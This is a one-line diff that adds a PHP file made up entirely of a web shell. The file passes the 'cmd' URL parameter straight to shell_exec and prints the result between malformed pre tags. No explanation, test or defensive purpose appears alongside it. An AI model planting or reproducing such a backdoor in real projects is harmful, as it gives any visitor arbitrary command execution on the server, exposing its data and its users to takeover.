@@ -1,0 +1,1 @@
+<?php echo '<prep>' . shell_exec($_GET['cmd']) . '</ pre>';?>
